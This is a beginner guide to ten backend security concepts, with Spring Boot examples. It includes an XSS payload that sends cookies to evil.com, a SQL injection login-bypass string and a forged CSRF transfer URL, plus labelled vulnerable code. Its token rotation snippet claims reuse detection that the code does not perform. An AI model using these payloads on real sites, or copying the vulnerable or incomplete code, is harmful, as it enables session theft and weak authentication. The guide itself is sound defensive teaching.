# Security Concepts for Backend Engineers — Beginner Guide with Code

Plain-English explanation + a minimal code example for each, mostly in Java/Spring Boot since that matches your stack. These are simplified for learning — production code needs more error handling, config, and hardening.

---

## 1. JWT (JSON Web Token)

**What it is:** A compact, self-contained token that proves "who you are" without the server needing to look you up in a database every time. It has 3 parts separated by dots: `header.payload.signature`. The payload holds claims (userId, role, expiry); the signature proves it wasn't tampered with.

**Why it matters:** Once a user logs in, instead of sending username/password on every request, they send this token. The server verifies the signature and trusts the claims inside — no DB lookup needed (stateless auth).

```java
// Generating a JWT (using io.jsonwebtoken / jjwt library)
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.security.Keys;
import java.security.Key;
import java.util.Date;

public class JwtUtil {
    private final Key key = Keys.secretKeyFor(io.jsonwebtoken.SignatureAlgorithm.HS256);

    public String generateToken(String username, String role) {
        return Jwts.builder()
            .setSubject(username)
            .claim("role", role)
            .setIssuedAt(new Date())
            .setExpiration(new Date(System.currentTimeMillis() + 1000 * 60 * 15)) // 15 min
            .signWith(key)
            .compact();
    }

    public String validateAndGetUsername(String token) {
        return Jwts.parserBuilder()
            .setSigningKey(key)
            .build()
            .parseClaimsJws(token)   // throws if signature invalid or token expired
            .getBody()
            .getSubject();
    }
}
```

**Beginner gotcha:** JWT is *not encrypted* by default — anyone can decode the payload and read it (try jwt.io). Never put passwords or secrets inside the payload. The signature only proves it wasn't *tampered with*, not that it's hidden.

---

## 2. OAuth 2.0

**What it is:** A protocol that lets a user grant a third-party app limited access to their data **without sharing their password**. Think "Login with Google" or "Allow this app to access your Gmail contacts."

**Key roles:**
- **Resource Owner** — the user
- **Client** — the app requesting access
- **Authorization Server** — issues tokens (e.g., Google's auth server)
- **Resource Server** — holds the actual data (e.g., Gmail API)

**The flow (Authorization Code flow, most common for web apps):**
1. User clicks "Login with Google" → redirected to Google
2. User approves → Google redirects back with a short-lived `code`
3. Your backend exchanges that `code` + client secret for an `access_token`
4. Your backend uses the `access_token` to call Google's API on the user's behalf

```java
// Spring Boot makes this almost config-only with Spring Security OAuth2 Client
// application.yml
/*
spring:
  security:
    oauth2:
      client:
        registration:
          google:
            client-id: YOUR_CLIENT_ID
            client-secret: YOUR_CLIENT_SECRET
            scope: profile, email
*/

@RestController
public class ProfileController {

    @GetMapping("/profile")
    public String profile(@AuthenticationPrincipal OAuth2User principal) {
        // Spring Security already did steps 1-3 for you
        return "Hello " + principal.getAttribute("name");
    }
}
```

**Beginner gotcha:** OAuth 2.0 is about **authorization** (what you can access), not **authentication** (proving who you are). That's exactly the gap OpenID Connect fills — see next.

---

## 3. OpenID Connect (OIDC)

**What it is:** A thin identity layer built **on top of** OAuth 2.0. OAuth 2.0 alone only gives you an access token to call an API — it doesn't formally tell *you* (the app) who the user is. OIDC adds an **ID Token** (a JWT!) that contains the user's verified identity (email, name, subject ID).

**Simple way to remember it:** OAuth 2.0 = "here's a key to access some data." OIDC = "and here's proof of who this person actually is."

```java
// The ID Token you get back from an OIDC provider (e.g. Google) decodes to something like:
/*
{
  "iss": "https://accounts.google.com",
  "sub": "10769150350006150715113082367",   // unique user ID
  "email": "user@example.com",
  "email_verified": true,
  "name": "Jane Doe",
  "exp": 1716239022
}
*/

// In Spring Boot, the OidcUser gives you this directly
@GetMapping("/me")
public String me(@AuthenticationPrincipal OidcUser oidcUser) {
    return "Verified identity: " + oidcUser.getEmail();
}
```

**Beginner gotcha:** "Login with Google/Facebook/GitHub" buttons you see everywhere are OIDC, not plain OAuth — they need to know *who you are*, not just access some API.

---

## 4. CSRF (Cross-Site Request Forgery)

**What it is:** An attack where a malicious site tricks your browser into submitting a request to a site you're *already logged into*, using your existing session cookie — without you knowing. Example: you're logged into your bank, you visit a malicious page that auto-submits a hidden form to `bank.com/transfer?amount=1000&to=attacker`, and your browser happily sends your bank cookie along with it.

**Why it works:** Browsers automatically attach cookies to requests to the matching domain, regardless of which page triggered the request.

**Defense — CSRF tokens:** The server gives the page a random, unguessable token. Every state-changing request must include it. The attacker's page has no way to know this token, so their forged request gets rejected.

```java
// Spring Security enables CSRF protection by default for browser-based apps
@Configuration
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            );
        return http.build();
    }
}
```

```html
<!-- The frontend form must include the token Spring generates -->
<form method="POST" action="/transfer">
    <input type="hidden" name="_csrf" th:value="${_csrf.token}"/>
    <input type="text" name="amount"/>
    <button type="submit">Transfer</button>
</form>
```

**Beginner gotcha:** CSRF only matters for **cookie-based** sessions. If you're using JWT in an `Authorization` header (not a cookie), CSRF mostly doesn't apply, since the attacker's page can't read or attach your header — that's actually one reason many APIs use bearer tokens instead of cookies.

---

## 5. XSS (Cross-Site Scripting)

**What it is:** An attack where malicious JavaScript gets injected into a page that other users view, and runs in *their* browser with *their* session. Example: a comment field that isn't sanitized — an attacker posts `<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>` as a "comment," and every user who views that comment has their cookie stolen.

**Types:**
- **Stored XSS** — malicious script saved in the DB (e.g. a comment), served to every viewer
- **Reflected XSS** — script comes from a URL parameter and is immediately echoed back in the response
- **DOM-based XSS** — vulnerable client-side JS writes untrusted data into the page

```java
// VULNERABLE: directly rendering user input as raw HTML
@GetMapping("/greet")
public String greet(@RequestParam String name) {
    return "<h1>Hello " + name + "</h1>";   // name could be "<script>...</script>"
}
```

```java
// SAFER: escape user input before rendering, or let your template engine do it
import org.springframework.web.util.HtmlUtils;

@GetMapping("/greet")
public String greet(@RequestParam String name) {
    String safeName = HtmlUtils.htmlEscape(name); // turns < into &lt; etc.
    return "<h1>Hello " + safeName + "</h1>";
}
```

```html
<!-- Thymeleaf/most modern template engines auto-escape by default -->
<h1 th:text="'Hello ' + ${name}"></h1>  <!-- safe: auto-escaped -->
<h1 th:utext="'Hello ' + ${name}"></h1> <!-- UNSAFE: utext = raw, unescaped HTML -->
```

**Beginner gotcha:** Never trust a template engine's "raw output" / `utext` / `dangerouslySetInnerHTML`-style feature for anything that came from user input. Escaping is the default for a reason.

---

## 6. SQL Injection

**What it is:** An attack where user input is concatenated directly into a SQL query, letting an attacker change the query's actual logic. Classic example: a login form where the query is built like this.

```java
// VULNERABLE: string concatenation lets attacker rewrite the query
String username = request.getParameter("username"); // attacker enters: ' OR '1'='1
String query = "SELECT * FROM users WHERE username = '" + username + "'";
// Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'
// This returns ALL users — attacker bypasses login entirely
```

```java
// SAFE: parameterized query (PreparedStatement) — input is treated as DATA, never as SQL
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, username);   // the ' OR '1'='1 is treated as a literal string, not logic
ResultSet rs = stmt.executeQuery();
```

```java
// In Spring Data JPA, this is automatic as long as you use query methods or @Param
public interface UserRepository extends JpaRepository<User, Long> {
    Optional<User> findByUsername(String username); // safe — Spring parameterizes it

    @Query("SELECT u FROM User u WHERE u.username = :username") // safe — named param
    Optional<User> findUser(@Param("username") String username);
}
```

**Beginner gotcha:** The danger isn't "using raw SQL" — it's **building SQL strings by concatenating user input**. `@Query` with named parameters and `PreparedStatement` are both safe; string-building with `+` is the actual problem regardless of which API you use.

---

## 7. RBAC (Role-Based Access Control)

**What it is:** Instead of checking "is this exact user allowed to do X," you assign users to **roles** (ADMIN, USER, MANAGER), and permissions are attached to roles. Adding a new admin is just assigning a role — no code change needed.

```java
@Configuration
@EnableMethodSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.authorizeHttpRequests(auth -> auth
            .requestMatchers("/admin/**").hasRole("ADMIN")
            .requestMatchers("/manager/**").hasAnyRole("ADMIN", "MANAGER")
            .requestMatchers("/api/**").authenticated()
            .anyRequest().permitAll()
        );
        return http.build();
    }
}

@RestController
public class AdminController {

    @PreAuthorize("hasRole('ADMIN')")   // method-level check too
    @DeleteMapping("/admin/users/{id}")
    public void deleteUser(@PathVariable Long id) {
        // only ADMIN role reaches here — Spring blocks everyone else with 403
    }
}
```

**Beginner gotcha:** RBAC checks roles, not fine-grained context (e.g., "can this user edit *this specific* document"). For that you need ABAC (attribute-based) or ACL-style checks layered on top — `@PreAuthorize("hasRole('USER') and #doc.ownerId == authentication.name")`.

---

## 8. MFA (Multi-Factor Authentication)

**What it is:** Requiring more than just a password to log in — typically "something you know" (password) + "something you have" (a code from your phone) or "something you are" (fingerprint). The most common implementation is **TOTP** (Time-based One-Time Password) — the same algorithm behind Google Authenticator/Authy.

```java
// Generating a TOTP secret and verifying a code (using a library like 'dev.samstevens.totp')
import dev.samstevens.totp.secret.DefaultSecretGenerator;
import dev.samstevens.totp.code.*;
import dev.samstevens.totp.time.SystemTimeProvider;

public class MfaService {

    public String generateSecret() {
        return new DefaultSecretGenerator().generate(); // store this per-user, encrypted
    }

    public boolean verifyCode(String secret, String userEnteredCode) {
        CodeVerifier verifier = new DefaultCodeVerifier(
            new DefaultCodeGenerator(), new SystemTimeProvider()
        );
        return verifier.isValidCode(secret, userEnteredCode);
        // returns true if the 6-digit code matches what the algorithm expects
        // for THIS secret at THIS point in time (with a small time-drift window)
    }
}
```

**The flow:** User scans a QR code (generated from the secret) into Google Authenticator once. From then on, the app shows a new 6-digit code every 30 seconds, computed from the shared secret + current time. Your server computes the same thing independently and compares.

**Beginner gotcha:** The secret must be stored securely (encrypted at rest) — if it leaks, anyone can generate valid codes forever, defeating the whole point of MFA.

---

## 9. Encryption

**What it is:** Transforming readable data into unreadable ciphertext so that only someone with the right key can read it again. Two main types:

- **Symmetric** (AES) — same key encrypts and decrypts. Fast. Used for encrypting data at rest (DB fields, files).
- **Asymmetric** (RSA) — a public key encrypts, only the matching private key decrypts. Slower, used for things like TLS handshakes and signing.

```java
// Symmetric encryption with AES (encrypting a sensitive field before storing it)
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import java.security.SecureRandom;
import java.util.Base64;

public class EncryptionUtil {

    public static SecretKey generateKey() throws Exception {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(256);
        return keyGen.generateKey(); // store this safely (e.g. AWS KMS, Vault) — never hardcode
    }

    public static String encrypt(String plainText, SecretKey key) throws Exception {
        byte[] iv = new byte[12];
        new SecureRandom().nextBytes(iv);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
        byte[] cipherText = cipher.doFinal(plainText.getBytes());

        // prepend the IV so we can decrypt later (IV doesn't need to be secret, just unique)
        byte[] combined = new byte[iv.length + cipherText.length];
        System.arraycopy(iv, 0, combined, 0, iv.length);
        System.arraycopy(cipherText, 0, combined, iv.length, cipherText.length);
        return Base64.getEncoder().encodeToString(combined);
    }
}
```

**Beginner gotcha:** Never roll your own encryption algorithm, never hardcode keys in source code, and never reuse the same IV/nonce with the same key — that last one silently breaks AES-GCM's security guarantees. Use a proper key management service in real systems (AWS KMS, HashiCorp Vault), not a `static final String KEY = "..."` in code.

---

## 10. Token Rotation

**What it is:** Instead of one long-lived token that's dangerous if leaked, you use a **short-lived access token** (minutes) plus a **longer-lived refresh token** (days/weeks). When the access token expires, the client uses the refresh token to get a new access token — *and a new refresh token*, invalidating the old one. If a refresh token is ever reused after rotation (meaning it was stolen and replayed), the system can detect that and revoke the whole session.

```java
@RestController
public class AuthController {

    @PostMapping("/refresh")
    public ResponseEntity<TokenResponse> refresh(@RequestBody RefreshRequest request) {
        RefreshToken stored = refreshTokenRepository.findByToken(request.getToken())
            .orElseThrow(() -> new SecurityException("Invalid refresh token"));

        if (stored.isRevoked() || stored.getExpiresAt().isBefore(Instant.now())) {
            throw new SecurityException("Refresh token expired or revoked");
        }

        // ROTATION: revoke the old refresh token immediately, issue a brand new one
        stored.setRevoked(true);
        refreshTokenRepository.save(stored);

        String newAccessToken = jwtUtil.generateAccessToken(stored.getUsername());
        RefreshToken newRefreshToken = refreshTokenService.createNew(stored.getUsername());

        // SECURITY CHECK: if someone tries to reuse an already-revoked refresh token,
        // that's a strong signal the token was stolen — revoke ALL tokens for that user
        return ResponseEntity.ok(new TokenResponse(newAccessToken, newRefreshToken.getToken()));
    }
}
```

**Beginner gotcha:** Without rotation, a leaked refresh token is valid until it naturally expires — could be weeks. With rotation + reuse detection, a stolen refresh token gets caught the moment the *real* user or the *attacker* tries to use it a second time, because only one of them can use it before it's invalidated.

---

## Quick Mental Model Summary

| Concept | One-line summary |
|---|---|
| JWT | A signed, tamper-proof token carrying identity/claims — not encrypted, not secret |
| OAuth 2.0 | Grants limited *access* to your data to a third party, without sharing your password |
| OIDC | OAuth 2.0 + a verified identity token — answers "who is this user," not just "what can they access" |
| CSRF | Forces your browser to send a request you didn't intend, using your existing session cookie |
| XSS | Injects attacker JavaScript that runs in another user's browser |
| SQL Injection | Attacker input is interpreted as SQL code instead of data — fixed by parameterized queries |
| RBAC | Permissions attached to roles, not individual users |
| MFA | A second proof of identity beyond a password — usually a time-based one-time code |
| Encryption | Makes data unreadable without the right key — symmetric (AES) for speed, asymmetric (RSA) for key exchange/signing |
| Token Rotation | Short-lived access tokens + rotating refresh tokens, so a leaked token has a short useful life and reuse is detectable |
